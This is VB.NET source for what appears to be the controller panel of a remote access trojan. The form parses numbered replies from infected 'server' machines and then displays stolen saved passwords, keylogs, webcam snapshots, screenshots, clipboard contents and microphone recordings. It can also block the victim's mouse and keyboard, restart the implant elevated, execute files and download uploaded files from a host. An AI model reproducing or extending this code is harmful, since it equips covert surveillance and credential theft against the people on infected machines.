Imports System.Threading
Imports System.IO




Public Enum WaitingStatus
    Uploading
    Waiting
    Downloading
End Enum
Public Class Waiting

    Public HostAddress As String = String.Empty

    Public LoadingThread As Thread
    Private command As String = Nothing
    Public Waitingtime As Integer = 0
    Public Event RegKeysListingFailed As EventHandler
    Public WaitingDuration As Integer = CInt(1500)

    Public ShowConfirmationMessageBox As Boolean = False

 

    Public Sub ShowAndSend(ByVal command As String)
        Me.command = command
        Me.ShowDialog()
    End Sub

    Private Sub Waiting_Shown(sender As Object, e As EventArgs) Handles Me.Shown
        If Not String.IsNullOrEmpty(command) Then
            Main.WriteCommand(command)
        End If
        command = Nothing

        ProgressBar1.Style = ProgressBarStyle.Marquee
        LoadingThread = New Threading.Thread(AddressOf WaitForResponse)
        LoadingThread.SetApartmentState(Threading.ApartmentState.STA)
        LoadingThread.Start()
    End Sub


    Public Sub UpdateStatus(ByVal Text As String, ByVal waitingStatus As WaitingStatus)
        If InvokeRequired Then
            Invoke(New Action(Of String, WaitingStatus)(AddressOf UpdateStatus), Text, waitingStatus)
        Else
            LabelLoadingStatus.Text = Text
            Select Case waitingStatus
                Case Client.WaitingStatus.Downloading
                    PictureBox1.Image = My.Resources.down
                Case Client.WaitingStatus.Uploading
                    PictureBox1.Image = My.Resources.up
                Case Client.WaitingStatus.Waiting
                    PictureBox1.Image = My.Resources.wait
            End Select
        End If
        Refresh()
    End Sub

    Public Sub WaitForResponse()
        Dim Response As String
        Dim continueLoop As Boolean = True
        Dim Waitingtime As Integer = 0
        While continueLoop
            Waitingtime = Waitingtime + 1
            If Waitingtime <= WaitingDuration Then
                System.Threading.Thread.Sleep(1000)
                Response = Main.ReadResponse()
                Invoke(New Action(Sub()
                                      continueLoop = Not AnalyzeResponse(Response)
                                  End Sub))
            Else
                continueLoop = False
                TopMost = False
                MsgBox("Timout. Please retry in a few seconds.", MsgBoxStyle.Exclamation)
                TopMost = True
                Invoke(New Action(Sub()
                                      Me.Close()
                                      Exit Sub
                                  End Sub))
            End If
        End While
    End Sub


    Public Function AnalyzeResponse(ByVal Response As String) As Boolean
        Console.WriteLine("Response: " & Response)
        If ((Not Response = "") Or (String.IsNullOrWhiteSpace(Response))) Then
            Dim ResponseCode As String = Response
            Select Case ResponseCode
                Case "1"
                    Main.CleanResponse()
                    Settings.AddLog("Success", Settings.State.Success, "Server closed.")
                    ShowSuccessMessageBox("Server closed with success.")
                    Main.Connect()
                    Return True
                Case "2"
                    Main.CleanResponse()
                    Settings.AddLog("Success", Settings.State.Success, "Server restarted.")
                    ShowSuccessMessageBox("Server restarted with success.")
                    Main.Connect()
                    Return True
                Case "3"
                    Main.CleanResponse()
                    Settings.AddLog("Success", Settings.State.Success, "Server restarted as admin.")
                    ShowSuccessMessageBox("Server restarted elevated with success.")
                    Main.Connect()
                    Return True
                Case "4"
                    Main.CleanResponse()
                    Settings.AddLog("Success", Settings.State.Success, "Server uninstalled.")
                    ShowSuccessMessageBox("Server uninstalled with success.")
                    Main.Connect()
                    Return True
                Case "5"
                    Processmanager.SplitData(Main.ReadData())
                    Main.CleanResponse()
                    Settings.AddLog("Success", Settings.State.Success, "Recieved processlist.")
                    ShowSuccessMessageBox("Recieved " & Processmanager.ListViewProcesses.Items.Count & " Processes.")
                    Return True
                Case "6"
                    Main.CleanResponse()
                    Settings.AddLog("Success", Settings.State.Success, "Process started.")
                    ShowSuccessMessageBox("Process started successfully.")
                    Return True
                Case "6x1"
                    Main.CleanResponse()
                    Settings.AddLog("Failed", Settings.State.Failed, "Couldn't start Process.")
                    ShowErrorMessageBox("Couldn't start Process.")
                    Return True
                Case "7"
                    Main.CleanResponse()
                    For Each i As ListViewItem In Processmanager.ListViewProcesses.SelectedItems
                        Processmanager.ListViewProcesses.Items.Remove(i)
                    Next
                    Settings.AddLog("Success", Settings.State.Success, "Process terminated.")
                    ShowSuccessMessageBox("Process terminated successfully.")
                    Return True
                Case "7x1"
                    Main.CleanResponse()
                    Settings.AddLog("Failed", Settings.State.Failed, "Unable to terminate process.")
                    ShowErrorMessageBox("Couldn't terminate Process.")
                    Return True
                Case "8"
                    Main.CleanResponse()
                    Me.Hide()
                    Dim ModuleList As String = Main.ReadData()
                    ProcessmanagerModules.ListModules(ModuleList)
                    Settings.AddLog("Success", Settings.State.Success, "Process modules loaded.")
                    Return True
                Case "8x1"
                    Main.CleanResponse()
                    Settings.AddLog("Failed", Settings.State.Failed, "Can't load process modules. Acess is denied.")
                    ShowErrorMessageBox("Couldn't load modules." & vbNewLine & "Access is denied.")
                    Return True
                Case "9"
                    Main.CleanResponse()
                    Servicemanager.SplitData(Main.ReadData)
                    Settings.AddLog("Success", Settings.State.Success, "Recieved servicelist.")
                    ShowSuccessMessageBox("Recieved " & Servicemanager.ListViewServices.Items.Count.ToString & " services.")
                    Return True
                Case "10"
                    Main.CleanResponse()
                    Settings.AddLog("Success", Settings.State.Success, "Service started.")
                    ShowSuccessMessageBox("Service started with success.")
                    Return True
                Case "10x1"
                    Main.CleanResponse()
                    Settings.AddLog("Failed", Settings.State.Failed, "Unable to start service.")
                    ShowErrorMessageBox("Unable to start service.")
                    Return True
                Case "11"
                    Main.CleanResponse()
                    Settings.AddLog("Success", Settings.State.Success, "Service stopped.")
                    ShowSuccessMessageBox("Service stopped with success.")
                    Return True
                Case "11x1"
                    Main.CleanResponse()
                    Settings.AddLog("Failed", Settings.State.Failed, "Unable to stop service.")
                    ShowErrorMessageBox("Unable to stop service.")
                    Return True
                Case "12"
                    Main.CleanResponse()
                    Dim SvcPath As String = Main.ReadData
                    Settings.AddLog("Success", Settings.State.Success, "Recieved service path.")
                    ShowSuccessMessageBox(SvcPath)
                    Return True
                Case "13"
                    Main.CleanResponse()
                    Systeminformation.SplitTreeviewData()
                    Settings.AddLog("Success", Settings.State.Success, "Recieved systeminformation.")
                    ShowSuccessMessageBox("Systeminformation recieved.")
                    Return True
                Case "14"
                    Main.CleanResponse()
                    Serverinformation.SplitTreeviewData()
                    Settings.AddLog("Success", Settings.State.Success, "Recieved serverinformation.")
                    ShowSuccessMessageBox("Serverinformation recieved.")
                    Return True
                Case "15"
                    Main.CleanResponse()
                    Windowmanager.SplitData(Main.ReadData)
                    Settings.AddLog("Success", Settings.State.Success, "Recieved active windows.")
                    ShowSuccessMessageBox("Active Windows recieved.")
                    Return True
                Case "16"
                    Main.CleanResponse()
                    Settings.AddLog("Success", Settings.State.Success, "Window restored.")
                    ShowSuccessMessageBox("Window restored with success.")
                    Return True
                Case "17"
                    Main.CleanResponse()
                    Settings.AddLog("Success", Settings.State.Success, "Window minimized.")
                    ShowSuccessMessageBox("Window minimized with success.")
                    Return True
                Case "18"
                    Main.CleanResponse()
                    Settings.AddLog("Success", Settings.State.Success, "Window maximized.")
                    ShowSuccessMessageBox("Window maximized with success.")
                    Return True
                Case "19"
                    Main.CleanResponse()
                    Settings.AddLog("Success", Settings.State.Success, "Window closed.")
                    ShowSuccessMessageBox("Window closed with success.")
                    Return True
                Case "20"
                    Main.CleanResponse()
                    Settings.AddLog("Success", Settings.State.Success, "Window freezed.")
                    ShowSuccessMessageBox("Window freezed with success.")
                    Return True
                Case "21"
                    Main.CleanResponse()
                    Settings.AddLog("Success", Settings.State.Success, "Window unfreezed.")
                    ShowSuccessMessageBox("Window unfreezed with success.")
                    Return True
                Case "22"
                    Main.CleanResponse()
                    Settings.AddLog("Success", Settings.State.Success, "Window title changed.")
                    ShowSuccessMessageBox("Window title changed with success.")
                    Return True
                Case "22x1"
                    Main.CleanResponse()
                    Settings.AddLog("Failed", Settings.State.Failed, "Window unfreezed.")
                    ShowErrorMessageBox("Failed changing the window title.")
                    Return True
                Case "23"
                    Main.CleanResponse()
                    Filemanager.SplitDrives(Main.ReadData)
                    Settings.AddLog("Success", Settings.State.Success, "Recieved drives.")
                    ShowSuccessMessageBox("Recieved drives with success.")
                    Return True
                Case "24"
                    Dim Data As String = Main.ReadData
                    Main.CleanResponse()
                    If Not String.IsNullOrEmpty(Path.GetDirectoryName(Filemanager.CurrentRemotePath)) Then
                        With Filemanager.ListViewRemoteFiles.Items.Add("..", 0)
                            .SubItems.Add("-")
                            .SubItems.Add("-")
                        End With
                    End If
                    Filemanager.FormateFilesFolders(Data)
                    Settings.AddLog("Success", Settings.State.Success, "Recieved files/folders.")
                    ShowSuccessMessageBox("Recieved Folders/Files with success.")
                    Return True
                Case "24x1"
                    Main.CleanResponse()
                    Settings.AddLog("Failed", Settings.State.Failed, "Unable to list files/folders. Access is denied.")
                    ShowErrorMessageBox("Failed listing files and folders. Access is denied.")
                    Return True
                Case "24x2"
                    Main.CleanResponse()
                    Settings.AddLog("Failed", Settings.State.Failed, "Unable to list files/folders.")
                    ShowErrorMessageBox("Failed listing files and folders.")
                    Return True
                Case "25"
                    Main.CleanResponse()
                    For Each i As ListViewItem In Filemanager.ListViewRemoteFiles.SelectedItems
                        Filemanager.ListViewRemoteFiles.Items.Remove(i)
                    Next
                    Settings.AddLog("Success", Settings.State.Success, "Folder deleted.")
                    ShowSuccessMessageBox("Folder deleted successfully.")
                    Return True
                Case "25x1"
                    Main.CleanResponse()
                    Settings.AddLog("Failed", Settings.State.Failed, "Unable to delete folder. Access is denied.")
                    ShowErrorMessageBox("Cannot delete folder. Access is denied.")
                    Return True
                Case "25x2"
                    Main.CleanResponse()
                    Settings.AddLog("Failed", Settings.State.Failed, "Unable to delete folder.")
                    ShowErrorMessageBox("Cannot delete folder.")
                    Return True
                Case "26"
                    Main.CleanResponse()
                    Settings.AddLog("Success", Settings.State.Success, "Opened folder.")
                    ShowSuccessMessageBox("Folder opened on remote computer with success.")
                    Return True
                Case "26x1"
                    Main.CleanResponse()
                    Settings.AddLog("Failed", Settings.State.Failed, "Unable to open folder.")
                    ShowErrorMessageBox("Failed opening folder on remote computer.")
                    Return True
                Case "27"
                    Main.CleanResponse()
                    Settings.AddLog("Success", Settings.State.Success, "Folder renamed.")
                    ShowSuccessMessageBox("Folder renamed with success.")
                    FilemanagerRenameFolder.Close()
                    Return True
                Case "27x1"
                    Main.CleanResponse()
                    Settings.AddLog("Failed", Settings.State.Failed, "Unable to rename folder.")
                    ShowErrorMessageBox("Failed renaming folder.")
                    FilemanagerRenameFolder.Close()
                    Return True
                Case "28"
                    Main.CleanResponse()
                    Settings.AddLog("Success", Settings.State.Success, "Folder created.")
                    ShowSuccessMessageBox("New folder created with success.")
                    FilemanagerCreateFolder.Close()
                    Return True
                Case "28x1"
                    Main.CleanResponse()
                    Settings.AddLog("Failed", Settings.State.Failed, "Unable to create folder. Access is denied.")
                    ShowErrorMessageBox("Failed creating new folder. Access is denied.")
                    FilemanagerCreateFolder.Close()
                    Return True
                Case "28x2"
                    Main.CleanResponse()
                    Settings.AddLog("Failed", Settings.State.Failed, "Unable to create folder.")
                    ShowErrorMessageBox("Failed creating new folder.")
                    FilemanagerCreateFolder.Close()
                    Return True
                Case "29"
                    Main.CleanResponse()
                    For Each i As ListViewItem In Filemanager.ListViewRemoteFiles.SelectedItems
                        Filemanager.ListViewRemoteFiles.Items.Remove(i)
                    Next
                    Settings.AddLog("Success", Settings.State.Success, "File deleted.")
                    ShowSuccessMessageBox("File deleted with success.")
                    Return True
                Case "29x1"
                    Main.CleanResponse()
                    Settings.AddLog("Failed", Settings.State.Failed, "Unable to delete file. Access is denied.")
                    ShowErrorMessageBox("Failed deleting file. Access is denied.")
                    Return True
                Case "29x2"
                    Main.CleanResponse()
                    Settings.AddLog("Failed", Settings.State.Failed, "Unable to delete file.")
                    ShowErrorMessageBox("Failed deleting file.")
                    Return True
                Case "30"
                    Main.CleanResponse()
                    Settings.AddLog("Success", Settings.State.Success, "File renamed.")
                    ShowSuccessMessageBox("File renamed with success.")
                    Filemanager.ListViewRemoteFiles.SelectedItems(0).Text = FilemanagerRenameFile.TextBoxRenameFile.Text
                    FilemanagerRenameFile.Close()
                    Return True
                Case "30x1"
                    Main.CleanResponse()
                    Settings.AddLog("Failed", Settings.State.Failed, "Unable to rename file. Access is denied.")
                    ShowErrorMessageBox("Failed renaming file. Access is denied.")
                    FilemanagerRenameFile.Close()
                    Return True
                Case "30x2"
                    Main.CleanResponse()
                    Settings.AddLog("Failed", Settings.State.Failed, "Unable to rename file.")
                    ShowErrorMessageBox("Failed renaming file.")
                    FilemanagerRenameFile.Close()
                    Return True
                Case "31"
                    Main.CleanResponse()
                    FilemanagerFileinfo.SplitFileInfo()
                    Settings.AddLog("Success", Settings.State.Success, "Recieved fileinformation.")
                    ShowSuccessMessageBox("Fileinfo recieved with success.")
                    FilemanagerFileinfo.ShowDialog()
                    Return True
                Case "32"
                    Main.CleanResponse()
                    Screenviewer.DownloadScreenshot(Main.ReadDataNoEncryption())
                    Settings.AddLog("Success", Settings.State.Success, "Recieved screenshot.")
                    ShowSuccessMessageBox("Screenshot recieved with success.")
                    Return True
                Case "32x1"
                    Main.CleanResponse()
                    Settings.AddLog("Failed", Settings.State.Failed, "Failed taking screenshot.")
                    ShowErrorMessageBox("Failed taking screenshot.")
                    Return True
                Case "33"
                    Main.CleanResponse()
                    Dim WebcamList As String = Main.ReadData
                    Webcamviewer.SplitWebcamDevices(WebcamList)
                    Settings.AddLog("Success", Settings.State.Success, "Recieved " & CType(Webcamviewer.ComboBoxWebcamDevices.Items.Count, String) & " webcam devices.")
                    ShowSuccessMessageBox(CType(Webcamviewer.ComboBoxWebcamDevices.Items.Count, String) & " webcam devices recieved with success.")
                    Return True
                Case "33x1"
                    Main.CleanResponse()
                    Settings.AddLog("Warning", Settings.State.Warning, "No webcam devices found.")
                    ShowErrorMessageBox("No webcams available.")
                    Return True
                Case "34"
                    Main.CleanResponse()
                    Dim WebcamImage As String = Main.ReadDataNoEncryption
                    Webcamviewer.PictureBoxWebcam.Image = Webcamviewer.HexToWebcamSnapshot(WebcamImage)
                    Settings.AddLog("Success", Settings.State.Success, "Webcam snapshot taken.")
                    ShowSuccessMessageBox("Webcam snapshot taken with success.")
                    Return True
                Case "34x1"
                    Main.CleanResponse()
                    Settings.AddLog("Failure", Settings.State.Failed, "Error taking webcam snapshot.")
                    ShowErrorMessageBox("Error taking webcam snapshot.")
                    Return True
                Case "35"
                    Main.CleanResponse()
                    Settings.AddLog("Success", Settings.State.Success, "File executed.")
                    ShowSuccessMessageBox("File executed with success.")
                    Return True
                Case "35x1"
                    Main.CleanResponse()
                    Settings.AddLog("Failed", Settings.State.Failed, "Failed executing file.")
                    ShowErrorMessageBox("Failed executing file.")
                    Return True
                Case "36"
                    Main.CleanResponse()
                    Dim RegistryData As String = Main.ReadData
                    Registrymanager.SplitRegistryData(RegistryData)
                    Settings.AddLog("Success", Settings.State.Success, "Recieved registrykeys/registryvalues.")
                    ShowSuccessMessageBox("Registrykeys/Registryvalues recieved with success.")
                    Return True
                Case "36x1"
                    Main.CleanResponse()
                    Settings.AddLog("Failed", Settings.State.Failed, "Unable to list registrykeys/registryvalues.")
                    ShowErrorMessageBox("Failed listing Registrykeys/Registryvalues.")
                    RaiseEvent RegKeysListingFailed(Me, EventArgs.Empty)
                    Return True
                Case "37"
                    Main.CleanResponse()
                    Settings.AddLog("Success", Settings.State.Success, "Registryvalue created.")
                    ShowSuccessMessageBox("Registryvalue created with success.")
                    RegistrymanagerCreateValue.Close()
                    Return True
                Case "37x1"
                    Main.CleanResponse()
                    Settings.AddLog("Failed", Settings.State.Failed, "Failed creating registryvalue. Access is denied.")
                    ShowErrorMessageBox("Failed creating registryvalue. Access is denied.")
                    RegistrymanagerCreateValue.Close()
                    Return True
                Case "37x2"
                    Main.CleanResponse()
                    Settings.AddLog("Failed", Settings.State.Failed, "Failed creating registryvalue.")
                    ShowErrorMessageBox("Failed creating registryvalue.")
                    RegistrymanagerCreateValue.Close()
                    Return True
                Case "38"
                    Main.CleanResponse()
                    Settings.AddLog("Success", Settings.State.Success, "Deleted registryvalue.")
                    For Each i As ListViewItem In Registrymanager.ListViewRegistryValue.SelectedItems
                        Registrymanager.ListViewRegistryValue.Items.Remove(i)
                    Next
                    ShowSuccessMessageBox("Registryvalue deleted with success.")
                    Return True
                Case "39"
                    Main.CleanResponse()
                    Settings.AddLog("Success", Settings.State.Success, "Modified registryvalue.")
                    ShowSuccessMessageBox("Registryvalue modified with success.")
                    Return True
                Case "39x1"
                    Main.CleanResponse()
                    Settings.AddLog("Failed", Settings.State.Failed, "Failed modifying registryvalue.")
                    ShowErrorMessageBox("Failed modifying registryvalue.")
                    RegistrymanagerCreateValue.Close()
                    Return True
                Case "40"
                    Main.CleanResponse()
                    Networkviewer.SplitTraffic(Main.ReadData)
                    Settings.AddLog("Success", Settings.State.Success, "Recieved active network traffic.")
                    ShowSuccessMessageBox("Recieved active network traffic.")
                    Return True
                Case "40x1"
                    Main.CleanResponse()
                    Settings.AddLog("Failed", Settings.State.Failed, "Unable to grab active network traffic.")
                    ShowErrorMessageBox("Failed getting network traffic.")
                    Return True
                Case "41"
                    Main.CleanResponse()
                    Settings.AddLog("Success", Settings.State.Success, "Taskbar hidden.")
                    ShowSuccessMessageBox("Taskbar is now hidden.")
                    Return True
                Case "42"
                    Main.CleanResponse()
                    Settings.AddLog("Success", Settings.State.Success, "Taskbar shown.")
                    ShowSuccessMessageBox("Taskbar is now visible.")
                    Return True
                Case "43"
                    Main.CleanResponse()
                    Settings.AddLog("Success", Settings.State.Success, "Clock hidden.")
                    ShowSuccessMessageBox("Taskbar is now hidden.")
                    Return True
                Case "44"
                    Main.CleanResponse()
                    Settings.AddLog("Success", Settings.State.Success, "Clock shown.")
                    ShowSuccessMessageBox("Clock is now visible.")
                    Return True
                Case "45"
                    Main.CleanResponse()
                    Settings.AddLog("Success", Settings.State.Success, "Taskbar locked.")
                    ShowSuccessMessageBox("Taskbar is now locked.")
                    Return True
                Case "46"
                    Main.CleanResponse()
                    Settings.AddLog("Success", Settings.State.Success, "Taskbar unlocked.")
                    ShowSuccessMessageBox("Taskbar is now unlocked.")
                    Return True
                Case "47"
                    Main.CleanResponse()
                    Settings.AddLog("Success", Settings.State.Success, "Desktop Icons hidden.")
                    ShowSuccessMessageBox("Desktop Icons hidden.")
                    Return True
                Case "48"
                    Main.CleanResponse()
                    Settings.AddLog("Success", Settings.State.Success, "Desktop Icons shown.")
                    ShowSuccessMessageBox("Desktop Icons shown.")
                    Return True
                Case "49"
                    Main.CleanResponse()
                    Settings.AddLog("Success", Settings.State.Success, "Mouse/Keyboard blocked.")
                    ShowSuccessMessageBox("Mouse/Keyboard are blocked.")
                    Return True
                Case "49x1"
                    Main.CleanResponse()
                    Settings.AddLog("Failed", Settings.State.Failed, "Can't block Mouse/Keyboard. Access is denied.")
                    ShowErrorMessageBox("Can't block Mouse/Keyboard. Access is denied.")
                    Return True

                Case "50"
                    Main.CleanResponse()
                    Settings.AddLog("Success", Settings.State.Success, "Mouse/Keyboard unblocked.")
                    ShowSuccessMessageBox("Mouse/Keyboard are unblocked.")
                    Return True
                Case "50x1"
                    Main.CleanResponse()
                    Settings.AddLog("Failed", Settings.State.Failed, "Can't unblock Mouse/Keyboard. Access is denied.")
                    ShowErrorMessageBox("Can't unblock Mouse/Keyboard. Access is denied.")
                    Return True
                Case "51"
                    Main.CleanResponse()
                    Settings.AddLog("Success", Settings.State.Success, "Mouse buttons swapped.")
                    ShowSuccessMessageBox("Mouse buttons swapped.")
                    Return True
                Case "52"
                    Main.CleanResponse()
                    Settings.AddLog("Success", Settings.State.Success, "Mouse buttons restored.")
                    ShowSuccessMessageBox("Mouse buttons restored.")
                    Return True
                Case "53"
                    Main.CleanResponse()
                    Settings.AddLog("Success", Settings.State.Success, "Computer had shut down.")
                    ShowSuccessMessageBox("Computer has shut down.")
                    MiscFunctions.Close()
                    Return True
                Case "54"
                    Main.CleanResponse()
                    Settings.AddLog("Success", Settings.State.Success, "Computer will reboot down.")
                    ShowSuccessMessageBox("Computer will reboot.")
                    MiscFunctions.Close()
                    Return True
                Case "55"
                    Main.CleanResponse()
                    Settings.AddLog("Success", Settings.State.Success, "Computer had log off.")
                    ShowSuccessMessageBox("Computer had log off.")
                    MiscFunctions.Close()
                    Return True
                Case "56"
                    Main.CleanResponse()
                    Settings.AddLog("Success", Settings.State.Success, "Screensaver launched.")
                    ShowSuccessMessageBox("Screensaver has been launched.")
                    Return True
                Case "57"
                    Main.CleanResponse()
                    Settings.AddLog("Success", Settings.State.Success, "Disk tray opened.")
                    ShowSuccessMessageBox("Disk tray has been opened.")
                    Return True
                Case "58"
                    Main.CleanResponse()
                    Settings.AddLog("Success", Settings.State.Success, "Disk tray closed.")
                    ShowSuccessMessageBox("Disk tray has been closed.")
                    Return True
                Case "59"
                    Main.CleanResponse()
                    Settings.AddLog("Success", Settings.State.Success, "MessageBox shown.")
                    ShowSuccessMessageBox("MessageBox has been shown.")
                    Return True
                Case "60"
                    Main.CleanResponse()
                    Settings.AddLog("Success", Settings.State.Success, "Clipboard text has been set.")
                    ShowSuccessMessageBox("Clipboard text has been set.")
                    Return True
                Case "61"
                    Main.CleanResponse()
                    Clipboard.RichTextBoxClipboard.Text = Main.ReadData
                    Settings.AddLog("Success", Settings.State.Success, "Clipboard text has been recieved.")
                    ShowSuccessMessageBox("Clipboard text recieved.")
                    Return True
                Case "62"
                    Main.CleanResponse()
                    Dim SoftwareList As String = Main.ReadData
                    Softwaremanager.SplitSoftwareList(SoftwareList)
                    Settings.AddLog("Success", Settings.State.Success, "Found " & Softwaremanager.ListViewSoftware.Items.Count.ToString & " installed programs.")
                    ShowSuccessMessageBox("Found " & Softwaremanager.ListViewSoftware.Items.Count.ToString & " installed programs.")
                    Return True
                Case "63"
                    Main.CleanResponse()
                    Dim PasswordList As String = Main.ReadData
                    PasswordRecovery.SplitData(PasswordList)
                    Settings.AddLog("Success", Settings.State.Success, "Found " & PasswordRecovery.ListViewPasswords.Items.Count.ToString & " saved passwords.")
                    ShowSuccessMessageBox("Found " & PasswordRecovery.ListViewPasswords.Items.Count.ToString & " saved passwords.")
                    Return True
                Case "64"
                    Dim Keylgs As String = Main.ReadData
                    Main.CleanResponse()
                    Keylogger.RichTextBoxKeylogs.Text = Keylgs
                    Keylogger.ColorTitles()
                    Settings.AddLog("Success", Settings.State.Success, "Recieved keylogs.")
                    ShowSuccessMessageBox("Keylogs recieved with success.")
                    Return True
                Case "65"
                    Main.CleanResponse()
                    Settings.AddLog("Success", Settings.State.Success, "Server is downloading the file.")
                    ShowSuccessMessageBox("Started file download with success.")
                    Return True
                Case "65x1"
                    Main.CleanResponse()
                    Settings.AddLog("Success", Settings.State.Success, "Failed starting file download.")
                    ShowErrorMessageBox("Failed starting file download.")
                    Return True
                Case "66"
                    Dim StartupPrograms As String = Main.ReadData
                    Main.CleanResponse()
                    Dim StartupProgramCount As Integer = StartupMonitor.GetPrograms(StartupPrograms)
                    Settings.AddLog("Success", Settings.State.Success, "Recieved " & CType(StartupProgramCount, String) & " startup programs.")
                    ShowSuccessMessageBox("Recieved startup programs.")
                    Return True
                Case "67"
                    Main.CleanResponse()
                    Settings.AddLog("Success", Settings.State.Success, "Removed startup program.")
                    If StartupMonitor.ListViewStartupPrograms.SelectedItems.Count > 0 Then
                        StartupMonitor.ListViewStartupPrograms.SelectedItems(0).Remove()
                    End If
                    ShowSuccessMessageBox("Removed startup program with success.")
                    Return True
                Case "67x1"
                    Main.CleanResponse()
                    Settings.AddLog("Failed", Settings.State.Failed, "Unable to remove startup program.")
                    ShowErrorMessageBox("Unable to remove startup program.")
                    Return True

                    '### File Download ###
                Case "68"
                    Main.CleanResponse()
                    Dim Filename As String = Main.ReadData
                    Settings.AddLog("Success", Settings.State.Success, "File is uploaded to server: " & Filename)
                    WaitingDuration = 12
                    Try
                        Dim wc As New Net.WebClient
                        wc.DownloadFile(Main.HostAdress & "/Uploads/" & Filename, Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\" & Filename)
                        MsgBox("File downloaded to Desktop: " & Filename, MsgBoxStyle.Information, "File Downloaded")
                    Catch ex As Exception
                        MsgBox(ex.Message, MsgBoxStyle.Critical)
                    End Try
                    Me.Close()
                    Return True
                Case "68x1"
                    Main.CleanResponse()
                    Settings.AddLog("Failed", Settings.State.Failed, "Unable to download file. Unknown Exception.")
                    WaitingDuration = 12
                    Me.Close()
                    ShowSuccessMessageBox("Download failed. Unknown error.")
                    Return True
                Case "68x2"
                    Main.CleanResponse()
                    Settings.AddLog("Failed", Settings.State.Failed, "Unable to download file. File not found")
                    WaitingDuration = 12
                    Me.Close()
                    ShowErrorMessageBox("Download failed. File not found.")
                    Return True
                Case "68x3"
                    Main.CleanResponse()
                    Settings.AddLog("Failed", Settings.State.Failed, "Download finished.")
                    WaitingDuration = 12
                    ShowErrorMessageBox("Download finished.")
                    Return True
                Case "69"
                    Main.CleanResponse()
                    Settings.AddLog("Success", Settings.State.Success, "Recorded microphone sound.")

                    WaitingDuration = 12
                    '####################

            End Select
        End If
        Return False
    End Function

    Private Sub ShowSuccessMessageBox(ByVal message As String)
        If ShowConfirmationMessageBox = True Then
            Main.TopMost = False
            Me.Hide()
            MessageBox.Show(message, "Success", MessageBoxButtons.OK, MessageBoxIcon.Information)
            Main.TopMost = True
            Me.Close()
        Else
            Me.Close()
        End If
    End Sub

    Private Sub ShowErrorMessageBox(ByVal message As String)
        Main.TopMost = False
        Me.Hide()
        MessageBox.Show(message, "Failed", MessageBoxButtons.OK, MessageBoxIcon.Error)
        Main.TopMost = True
        Me.Close()
    End Sub

End Class